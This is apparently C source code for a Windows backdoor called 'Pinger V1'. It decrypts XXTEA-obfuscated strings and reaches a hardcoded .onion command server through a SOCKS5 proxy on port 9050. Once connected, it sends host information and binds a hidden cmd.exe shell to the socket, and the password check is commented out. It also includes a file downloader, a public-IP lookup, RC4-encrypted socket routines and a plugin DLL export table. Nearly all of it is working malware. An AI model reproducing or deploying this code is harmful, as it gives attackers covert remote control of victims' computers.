/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 *                                  Pinger V1
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * Copyright (C) 2011, William H. Welna All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY William H. Welna ''AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL William H. Welna BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 */

 #include "main.h"

/* static char *gateway_nodes[] = {"\xA0\x17\x45\x11\xB5\x7D\x33\x5C\x02\xA7\x5F\x28\x50\x00\xC9\x01\xA3\x5A\x95\xAE\x73\xE6\x89\x0D\x58\xA4\xCA\xD6\x8A\x3C\xEE\xD5\x32\x47\xA3\xD0\x8C\x73\x53\xD8\x45\xD7\x89\x3B\x23\xE4\x74\x95\x1F\xE3\x34\x06\x24\x1C\xDD\xDD\x2D\x93\x56\x4A\x47\x18\xE7\x60",
                                "\x6D\x55\xC0\x08\x09\x5E\x08\x7E\x55\x48\x68\x97\x1A\xDD\xAC\x1F\xC3\xCF\xB1\x96\x70\xF8\xEF\xA1\x81\x3D\x32\xD6\x5B\xA8\x38\x75\xD6\x07\xE5\x3B\xA0\xF1\xB6\x02\xAD\xFC\x2D\xED\x0E\x8F\xA3\x91\xA6\x86\x42\xBB\x6E\x99\xD6\xE7\x4C\xBD\x8F\x57\xC2\x8A\xC3\x91",
                                "\xEC\xD8\x7E\x0D\x8A\xB1\x6E\x09\x60\x82\x64\x3A\x8E\x59\x1A\x3E\x9D\x1D\xC7\xB8\xD0\xB5\x28\xF6\x72\xA7\x86\x67\x6A\xF6\x44\x15\x8C\xFC\xD9\x22\x79\xB9\xD8\x0B\x03\x00\xCF\x9A\x73\xAE\xF9\x42\x3D\x82\x28\xEE\x23\x45\xCF\x0E\x50\x8E\xF3\x62\x99\xE3\x01\xCA",
                                "\x89\xEF\xF4\x96\x03\x51\xBB\xCA\x07\x45\x3C\x1E\x02\x7C\x64\x9F\xD4\x41\x49\xA2\x64\xA9\x8F\x67\x6C\x4C\x72\xDA\xAF\x8F\xB5\x71\x73\x7E\x0F\x5A\xFE\xAD\x01\xEB\xD4\x69\x00\x00\x53\x7C\x5B\x90\xC3\x25\x35\x64\x04\x0E\x87\x04\x04\xBD\x3A\xF6\x7C\x69\xDB\xFA",
                                "\xAC\x48\x65\xE0\x85\xF9\x89\x13\x0C\x6B\x37\x96\x7D\x04\xC5\xEF\x67\x50\xEF\xAF\x65\x75\x71\x01\xDA\xE8\xDE\x58\x02\x59\xDE\x22\x49\xF9\x0B\xA3\xF9\x05\xA5\x0D\x49\xD5\x4F\x35\x83\xAC\x39\x2B\x77\xB2\x37\x5E\xC9\x22\xA7\xDA\x0F\xDB\xFB\x7A\x40\x38\xEE\x85",
                                "\x8A\x5D\xD1\xE7\x70\xC2\xBC\xBC\x40\xF3\x66\xBB\x9D\x1C\x0F\x1C\xD9\x7C\x02\x35\x2E\x22\x69\x0A\xEE\x09\xD2\x69\xFE\xAD\xC1\x77\x4D\xD9\x87\x6D\xC6\x08\x1E\x3A\x49\x4E\xE3\x3D\x08\x09\x75\xD8\xD4\x9A\xA6\x2E\xEA\x8C\x8D\x56\x61\xD6\x1B\x4C\x5F\xF2\x2E\x80",
                                NULL}; */

static char *gateway_nodes[] = {"usercenteredenterprise.com", NULL};

//static char *onion_addresses[] = {"\x21\xAC\x8F\x28\xA5\xC0\x51\x2B\xFE\xDF\x11\x79\xF2\x5C\xCB\x5D\x90\xE0\xFD\x6D\xFD\x3D\x89\x1E\xC2\x9C\xF3\xAE\xAA\x03\xDF\x06\xCB\x59\xF7\xCC\xE5\x03\x0F\x45\x04\xCE\x30\xAC\xCB\x91\xB2\x46\xDD\xB5\x34\x04\x58\x24\x1B\xB3\x45\x96\x64\xF1\x25\xB7\x9B\x0B", NULL};

static char *onion_addresses[] = {"vh42m7aviejcxwts.onion", NULL};

static char *automation_whatismyip = "\x69\x27\x92\x53\xD4\xD4\x71\x99\xFB\xD9\xBA\x7B\x55\xF4\x55\xA4\x3E\xAC\x7F\xB2\x82\xFC\xE3\x7D\x2A\x31\xB0\x8A\x47\x77\x87\x64\xC5\x02\xE5\x4A\x3D\xC4\x00\xDD\xCE\xC6\x44\x44\x88\xD2\xB9\x0D\x1C\x16\xB9\x61\x44\x84\xFB\x8A\x41\xDF\x10\xB2\x4B\x4A\x1B\xF3";
static char *whatismyip_request = "\xCD\xAE\x0C\x88\xA2\x97\x05\x7D\x3B\xCC\x8D\x0F\xB4\x19\xE1\x5D\x52\xB0\x09\x33\x0E\x3B\xA8\x78\x7E\xC4\xD9\xE2\xB3\x3A\x6C\x84\xC1\x2E\xFD\x3C\x6C\x83\xFE\xBF\x7D\xD5\x3C\xA5\xB9\x0B\x09\xD5\x55\x40\xA8\xE5\xE6\x6F\xBA\xFE\x22\x92\x10\xBC\x17\xE3\x40\x9B\x9B\xFF\xF5\x83\xD6\x55\x5D\x2D\x1B\xDC\x5A\x3D\x54\x96\x61\x5B\x46\xDE\xC8\x3E\xC5\x7E\x5F\x4B\xB1\x5C\x6C\xA8\x7E\xFD\x15\xD9\x3D\xB7\x71\xB3\x2B\x43\x90\xAC\xEA\x68\x1E\x66\xAA\xF8\xEC\x61\xBF\x44\x50\xE6\xA3\x20\x76\x27\xC2\x9E\xBD\x35\x43\x03\x60\x61";

static char *port_80 = "\xEF\xC0\x8C\x20\xE7\x82\x75\x78\xFC\xD9\xB9\x0B\x2A\xA4\xD7\xA7\x28\xDA\xCC\xFC\x80\x60\x00\xBA\x83\x86\xF6\x44\xA2\x91\x06\x13";
static char *port_9050 = "\x19\x12\xAC\x37\x3A\xB0\x3E\x5F\xB0\x83\xE7\xF5\x33\xB1\x4D\xF3\x05\x06\x79\xF5\x80\x17\x7A\xC1\xFD\xDF\x6D\x28\x7B\xA9\xE1\xCD";

static char *comspec = "\x82\x64\x1F\xC5\x38\xE0\x55\xCF\x60\x55\xB0\x8F\x52\x7E\xB8\x2F\xFD\x72\x34\x20\xD7\x69\xC3\x16\xAC\x1D\xF6\x49\x20\x0F\x05\x13";

static char *password_auth = "X";

static char *auth_prompt = "\xDE\x6F\xFC\xEA\x9B\xA8\x92\x14\xA6\x47\x94\xF4\x38\x8A\xEF\xEF\xDF\x58\xA6\x11\xC5\x8E\x89\x24\x07\xC7\x09\x53\x0A\x66\x8A\xE8";

static uint32_t cryptkey[4] = { 0xDEAD, 0xEDAD, 0xADED, 0xDAED };
static char *sanguinerose = "\xA7\x75\x8E\x6F\x86\xE3\xC5\x9B\x9A\x47\x1B\x37\x9B\xCC\xCB\xC3\xCE\x0B\x0E\xBA\x81\xC6\xB6\x66\x89\xBA\x03\x67\xDD\x4C\x19\xB1";

static char *self;

static struct {
	void (*ksa)(RC4_KEY *, const char *, int);
	void (*crypt)(RC4_KEY *, char *, int);
	void (*prng)(RC4_KEY *);
	void (*drop)(RC4_KEY *, int);
	int (*generate)(RC4_KEY *);
} rc4 = { &rc4_ksa, &rc4_crypt, &rc4_prng, &rc4_drop, &generate_key };

static struct {
	int (*connect)(RC4_KEY *, uint32_t *, int);
	int (*listen)(RC4_KEY *, uint32_t *, int);
	int (*send)(RC4_KEY *, int, char *, int);
	char *(*recv)(RC4_KEY *, int, char *, int *);
	int (*printf)(RC4_KEY *, int, char *, ...);
} crypt_socks = { &crypt_connect, &crypt_listen, &crypt_send, &crypt_recv, &crypt_printf };

static struct {
	void (*xxtea)(uint32_t *, int, uint32_t *);
	uint32_t (*char2uint32)(char *);
	uint32_t *keys;
} tea = { &btea, &compress, cryptkey };

static struct {
	void *(*find)(char *, int, char *, int);
	int (*cmp)(char *, char *, int);
	int (*len)(char *);
	void (*cpy)(char *, char *, int);
	void (*zero)(char *, int);
	void (*cat)(char *, char *);
} utils = { &find, &mycmp, &mylen, &mycpy, &myzero, &mycat };

static struct {
	int (*connect)(char *, char*);
	int (*listen)(char *, char *, int, int, int);
	int (*close)(int);
	int (*send)(int, char *, int, unsigned int);
	int (*recv)(int, char *, int, unsigned int);
	int (*socks5)(char *, char *, char *, char *);
} socks = { &ipv4_connect, &ipv4_listen, &ipv4_close, &ipv4_send, &ipv4_recv, &socks5_connect };

static struct {
	rc4_export *rc4_def;
	crypt_socks_export *crypt_socks_def;
	tea_export *tea_def;
	utils_export *utils_def;
	socks_export *socks_def;
} export_functions_table;

void set_exports() {
	export_functions_table.rc4_def = &rc4;
	export_functions_table.crypt_socks_def = &crypt_socks;
	export_functions_table.tea_def = &tea;
	export_functions_table.utils_def = &utils;
	export_functions_table.socks_def = &socks;
}

void test_dll() {
	HMODULE dll = LoadLibrary("testdll.dll");
	void (*Test)(export_table *) = GetProcAddress(dll, "Gewgle");
        Test(&export_functions_table);
	FreeLibrary(dll);
}

void start() {
    int x;
//    for(x=0; gateway_nodes[x] != NULL; x++)
//        btea(gateway_nodes[x], -16, cryptkey);
//    for(x=0; onion_addresses[x] != NULL; x++)
//        btea(onion_addresses[x], -16, cryptkey);
    btea(automation_whatismyip, -16, cryptkey);
    btea(whatismyip_request, -32, cryptkey);
    btea(port_80, -8, cryptkey);
    btea(port_9050, -8, cryptkey);
    btea(password_auth, -16, cryptkey);
    btea(auth_prompt, -8, cryptkey);
    btea(comspec, -8, cryptkey);
    set_exports();
}

int main(int argc, char **argv) {
//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    int x;
    char *b = calloc(4096, sizeof(char));
    WSADATA wsainfo;
    self = calloc(MAX_PATH, sizeof(char));
    myzero(self, MAX_PATH);
    if(!b || !self)
	    return 0;
    if(!GetModuleFileName(NULL, b, MAX_PATH))
	    return 0;
    WSAStartup(0x22, &wsainfo);
    start();
    //test_dll();
    //http_download("google.com", "80", "www.google.com", "/", "test.html", FILE_ATTRIBUTE_NORMAL);
    /* for(x=0; onion_addresses[x] != NULL; x++)
        pingback(onion_addresses[x], "Win32", "IP HERE"); //"//getip(b)); */
        //pingback(onion_addresses[x], "", getip(b));
    pingback(onion_addresses[0], "Win32", "IP HERE");
    WSACleanup();
    free(b);
    return 0;
}

int pingback(char *onion, char *agent, char *info) {
    int x;
    char *b;
    //int sock = socks5_connect("localhost", port_9050, onion, port_80); // Try default gateway
    int sock = socks5_connect(gateway_nodes[0], port_9050, onion, port_80); // Try default gateway
    if(sock < 0) { // If connect error revert to other gateways
        for(x=1; gateway_nodes[x] != NULL; x++) {
            sock = socks5_connect(gateway_nodes[x], port_9050, onion, port_80);
            if(sock > 0)
                break; // Success!
        }
    }
    if(sock > 0) {
	_DMSG("Sending info\n");
        send(sock, info, mylen(info), 0);
        cmd_shell(sock);
        ipv4_close(sock);
        return 0;
    } else
        return -1; // Still can't connect?!?!
}

int http_download(char *host, char *port, char *http_host, char *path, char *localfile, int attributes) {
    char *p, *b = calloc(1024, sizeof(char)), *needle = "\r\n\r\n";
    int sock = ipv4_connect(host, port), x=0, y=0;
    HANDLE f = CreateFile(localfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, attributes, NULL);
    if((f == INVALID_HANDLE_VALUE) || (!b) || (sock < 0)) {
    	if(sock > 0)
		ipv4_close(sock);
    	if(b)
		free(b);
	return 0;
    }
    myzero(b, 1024);
    snprintf(b, 1024, "GET %s HTTP/1.1\nHost: %s\nConnection: close\n\n", path, http_host);
    send(sock, b, mylen(b), 0);
    x=recv(sock, b, 1024, 0);
    if((p=find(b, mylen(b), needle, mylen(needle)))!=NULL) {
	    y = (int)p - (int)b; // Get offset
	    x -= y; // Find out what's left after the header
	    WriteFile(f, p, x, &y, NULL); // Write rest to file
	    while((x=recv(sock, b, 1024, 0))>0) { // Keep reading until socket close
		WriteFile(f, b, x, &y, NULL); // Write to file
	    }
    } else {
        free(b);
        ipv4_close(sock);
	CloseHandle(f);
        return 0;
    }
    free(b);
    ipv4_close(sock);
    CloseHandle(f);
    return 1;
}

int ipv4_connect(char *host, char *port) {
	struct addrinfo hints, *servinfo=NULL, *p=NULL;
	Socket sock;
	int r, y=1;
	myzero(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		_DMSG(gai_strerror(r));
		return -1;
	}
	//_DMSG("host: %s:%s\n", host, port);
	for(p = servinfo; p != NULL; p = p->ai_next) { 
		if((sock = WSASocket(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == INVALID_SOCKET) {
			continue;
		}
		//setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &y, 4);
		if(connect(sock, p->ai_addr, p->ai_addrlen) == SOCKET_ERROR) {
			ipv4_close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		return -2;
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	return sock;
}

int ipv4_send(int sock, char *b, int size, unsigned int timeout) {
	fd_set fds;
	struct timeval tv;
	int r;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	tv.tv_sec=timeout; tv.tv_usec=0;
	if((r=select(0, NULL, &fds, NULL, &tv))!=SOCKET_ERROR) {
		if(FD_ISSET(sock, &fds)) { // Can Write
			return send(sock, b, size, 0);
		} else if(r==0) // Timeout
			return 0;
		else
			return -2; // wtf?
	} else
		return -1; // Actual Error
}

int ipv4_recv(int sock, char *b, int size, unsigned int timeout) {
	fd_set fds;
	struct timeval tv;
	int r;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	tv.tv_sec=timeout; tv.tv_usec=0;
	if((r=select(0, &fds, NULL, NULL, &tv))!=SOCKET_ERROR) {
		if(FD_ISSET(sock, &fds)) { // Can Receive
			return recv(sock, b, size, 0);
		} else if(r==0) // Timeout
			return 0;
		else
			return -2; // wtf?
	} else
		return -1;	
}

void cmd_shell(int sock) {
	char *b = calloc(1024, sizeof(char));
	if(b) {
		send(sock, auth_prompt, mylen(auth_prompt), 0);
		recv(sock, b, 1024, 0);
		//printf("%s -> %s\n", b, password_auth);
		//if(find(b, 1024, password_auth, mylen(password_auth))) { // Password is correct
			bindshell(sock); // Bind a shell
		//}
		free(b);
	}
}

/* SOCK_STREAM, IPPROTO_TCP, SOCK_DGRAM, IPPROTO_UDP */
int ipv4_listen(char *ip, char *port, int backlog, int family, int proto) {
	struct sockaddr_in si;
	int y=1;
	Socket sock = socket(AF_INET, family, proto);
	if(sock == INVALID_SOCKET) {
		return -1;
	}
	myzero(&si, sizeof(struct sockaddr_in));
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &y, sizeof(int));
	si.sin_family = AF_INET;
	if(ip==NULL) {
		si.sin_addr.s_addr = INADDR_ANY;
	} else {
		si.sin_addr.s_addr = inet_addr((ip));
	}
	si.sin_port = htons(atoi(port));
	if(bind(sock, &si, sizeof(struct sockaddr_in))==SOCKET_ERROR) {
		closesocket(sock);
		return -1;
	}
	if(family == SOCK_STREAM) {
		if(listen(sock, backlog)==SOCKET_ERROR) {
			closesocket(sock);
			return -1;
		}
	}
	return sock;
}

int ipv4_close(int sock) {
    closesocket(sock);
    return 0;
}

int socks5_connect(char *proxy_host, char *proxy_port, char *host, char *port) {
	char *buf = calloc(1024, sizeof(char));
	short l = mylen(host), t;
	int x;
	int sock;
	//_DMSG("%s:%s %s:%s\n", proxy_host, proxy_port, host, port);
	if((sock=ipv4_connect(proxy_host, proxy_port))<0) {
		free(buf);
		return sock;
	}
	_DMSG("Proxy Connected\n");
	send(sock, "\x05\x01\x00", 3, 0); // SOCKS5, 1 Authentication Method, No Auth/Plain
	recv(sock, buf, 1024, 0);
	_DMSG("Initial Recv Done\n");
	if((buf[0] != 0x05) || (buf[1] == 0xFF) || (buf[1] != 0x00)) {
	    _DMSG("Connect Error");
		free(buf);
		return -3; // Auth not accepted by socks server / wrong version
	}
	buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x03; buf[4] = l;
	for(x=0; x < l; x++)
		buf[5+x] = host[x];
	x=l+5;
	t = htons(atoi(port));
	mycpy((buf+x), &t, 2);
	//dump_array("final_request", buf, x+2);
	_DMSG("Sent Request\n");
	send(sock, buf, x+2, 0);// send request
	recv(sock, buf, 1024, 0);
	if((buf[0] == 0x05) && (buf[1] == 0x00)) { // connection granted/success
		_DMSG("Request Completed\n");
		free(buf);
		return sock;
	}
	_DMSG("Request Failed\n");
	free(buf);
	return -4; // Unable to conect
}

int http_connect(char *proxy_host, char *proxy_port, char *host, char *port) {
	return 0;
}

/* 
int mylen(char *s) {
    int c=0;
    char *p;
    for(p=s; *p != '\0'; *p++)
	    c++;
    return c;
}

int mycmp(char *s1, char *s2, int size) {
    int x;
    for(x=0; x < size; x++)
        if(s1[x] != s2[x])
            return 0;
    return 1;
}

void myzero(char *s, int size) {
	int x;
	for(x=0; x < size; *s++,x++) {
		*s = '\0';
	}
}

void mycpy(char *d, char *s, int size) {
	int x;
	for(x=0; x < size; *d++,*s++,x++)
		*d = *s;
}

void mycat(char *s1, char *s2) {
	char *p=s1+mylen(s1);
	mycpy(p, s2, mylen(s2));
}

void *find(char *haystack, int haystack_size, char *needle, int needle_size) {
    int x;
    void *p=NULL;
    for(x=0; x < haystack_size-needle_size; x++) {
        if(mycmp(haystack+x, needle, needle_size)) {
            p = haystack+x+needle_size;
        }
    }
    return p;
} */

char *getip(char *s) {
    char *p, *b = calloc(4096, sizeof(char)), *needle = "\r\n\r\n";
    int sock = ipv4_connect(automation_whatismyip, port_80), x=0;
    if(!b) { // Allocation Error
        ipv4_close(sock);
        return NULL;
    }
    if(sock < 0) { // Connect Error
        free(b);
        return NULL;
    }
    send(sock, whatismyip_request, mylen(whatismyip_request), 0);
    x=recv(sock, b, 4096, 0);
    if((p=find(b, mylen(b), needle, mylen(needle)))!=NULL) {
        mycpy(s, p, mylen(p));
        free(b);
    } else {
        free(b);
        ipv4_close(sock);
        return NULL;
    }
    ipv4_close(sock);
    return s;
}

void bindshell(int sock) {
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    HANDLE currentProcess=GetCurrentProcess(), input, output;
    DuplicateHandle(currentProcess, (HANDLE)sock, currentProcess, &output, 0, TRUE, DUPLICATE_SAME_ACCESS);
    DuplicateHandle(currentProcess, (HANDLE)sock, currentProcess, &input, 0, TRUE, DUPLICATE_SAME_ACCESS);
    myzero(&si, sizeof(si));
    myzero(&pi, sizeof(si));
    GetStartupInfo(&si);
    si.cb = sizeof(si);
    si.hStdInput = (HANDLE)input;
    si.hStdOutput = (HANDLE)output;
    si.hStdError = (HANDLE)output;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    CreateProcess(getenv(comspec), getenv(comspec), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject( pi.hProcess, INFINITE );
    CloseHandle(input);
    CloseHandle(output);
    CloseHandle(pi.hProcess);
}

int crypt_listen(RC4_KEY *k, uint32_t xxtea_key[4], int sock) {
	uint8_t rc4_key[16];
	char *b="XxXx";
	int x=recv(sock, rc4_key, 16, 0);
	if(x != 16)
		return 0;
	btea(rc4_key, -4, xxtea_key);
	rc4_ksa(k, rc4_key, 16);
	rc4_drop(k, 1024);
	if(crypt_send(k, sock, b, 4)==4) { // send test/confirmation handshake
		return 1;
	} else
		return 0;
}

int crypt_connect(RC4_KEY *k, uint32_t xxtea_key[4], int sock) {
	uint8_t rc4_key[16];
	char b[4];
	int x;
	for(x=0; x < 16; x++)
		rc4_key[x] = k->key[x];
	btea(rc4_key, 4, xxtea_key);
	if(send(sock, rc4_key, 16, 0)!=16)
		return 0;
	x=4;
	if(!crypt_recv(k, sock, b, &x))
			return 0;
	if((x == 4) && (b[0] == 'X') && (b[1] == 'x') && (b[2] == 'X') && (b[3] == 'x'))
		return 1;
	else
		return 0;
}

int crypt_printf(RC4_KEY *k, int sock, char *fmt, ...) {
	char b[1024];
	va_list l;
	myzero(b, 1024);
	va_start(l, fmt);
	vsnprintf(b, 1024, fmt, l);
	va_end(l);
	return crypt_send(k, sock, b, mylen(b));
}

int crypt_send(RC4_KEY *k, int sock, char *d, int len) {
	rc4_crypt(k, d, len);
	return send(sock, d, len, 0);
}

char *crypt_recv(RC4_KEY *k, int sock, char *d, int *len) {
	int r;
	myzero(d, *len);
	if((r=recv(sock, d, *len, 0)) > 0) {
		rc4_crypt(k, d, r);
		*len = r;
		return d;
	} else {
		*len=0;
		return NULL;
	}
}

uint32_t compress(char *s) {
    int a=0xFF000000, b=0x00FF0000, c=0x0000FF00, d=0x000000FF;
    a &= s[0] << 24;
    b &= s[1] << 16;
    c &= s[2] << 8;
    d &= s[3];
    return (a + b + c + d);
}

#define DELTA 0x9e3779b9
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))

void btea(uint32_t *v, int n, uint32_t const key[4]) {
	uint32_t y, z, sum;
	unsigned p, rounds, e;
	if (n > 1) {          /* Coding Part */
		rounds = 6 + 52/n;
		sum = 0;
		z = v[n-1];
		do {
			sum += DELTA;
			e = (sum >> 2) & 3;
			for (p=0; p<n-1; p++) {
				y = v[p+1];
				z = v[p] += MX;
			}
			y = v[0];
			z = v[n-1] += MX;
		} while (--rounds);
	} else if (n < -1) {  /* Decoding Part */
		n = -n;
		rounds = 6 + 52/n;
		sum = rounds*DELTA;
		y = v[0];
		do {
			e = (sum >> 2) & 3;
			for (p=n-1; p>0; p--) {
				z = v[p-1];
				y = v[p] -= MX;
			}
			z = v[n-1];
			y = v[0] -= MX;
		} while ((sum -= DELTA) != 0);
    }
}

void rc4_ksa(RC4_KEY *k, const char *keydata, int size) {
	uint8_t t;
	myzero(k, sizeof(RC4_KEY));
	for(k->i=0; k->i < 255; k->i++)
		*(k->s+k->i)=k->i;
	for(k->i=0; k->i < 255; k->i++) {
		k->j=((k->j+*(k->s+k->i)) + *(keydata+(k->i%size)))%256;
		t=*(k->s+k->j);
		*(k->s+k->j)=*(k->s+k->i);
		*(k->s+k->i)=t;
	}
	k->i=0;
	k->j=0;
}

void rc4_crypt(RC4_KEY *k, char *d, int size) {
	uint8_t t, x;
	for(x=0; x < size; x++) {
		k->i=(k->i+1)%256;
		k->j=(k->j+*(k->s+k->i))%256;
		t=*(k->s+k->j);
		*(k->s+k->j)=*(k->s+k->i);
		*(k->s+k->i)=t;
		t=(*(k->s+k->i)+*(k->s+k->j))%256;
		*(d+x)=*(k->s+t)^*(d+x);
	}
}

uint8_t rc4_prng(RC4_KEY *k) {
	uint8_t t;
	k->i=(k->i+1)%256;
	k->j=(k->j+*(k->s+k->i))%256;
	t=*(k->s+k->j);
	*(k->s+k->j)=*(k->s+k->i);
	*(k->s+k->i)=t;
	t=(*(k->s+k->i)+*(k->s+k->j))%256;
	return *(k->s+t);
}

void rc4_drop(RC4_KEY *k, int num) {
	int x;
	for(x=0; x < num; x++)
		rc4_prng(k);
}

int generate_key(RC4_KEY *k) {
	rand_seed r;
	RC4_KEY *p=calloc(1, sizeof(RC4_KEY));
	int x, y;
	if(!p) {
		return 0;
	}
	srand(time(&r.t));
	y=RAND_MAX%r.t;
	for(x=0; x < y; x++)
		srand(rand());
	for(x=0; x < 6; x++)
		r.mac[x] = rand();
	r.rand_num = rand();
	r.k[0] = cryptkey[0]; r.k[1] = cryptkey[1]; r.k[2] = cryptkey[2]; r.k[3] = cryptkey[3];
	rc4_ksa(p, (void *)&r, sizeof(rand_seed));
	rc4_drop(p, (rand()%1024)+1024); // rc4-drop(1024-2048)
	for(x=0; x < 16; x++)
		k->key[x] = rc4_prng(p);
	rc4_ksa(k, k->key, 16);
	rc4_drop(k, 1024); // Moar Drop
	free(p);
	return 1;
}
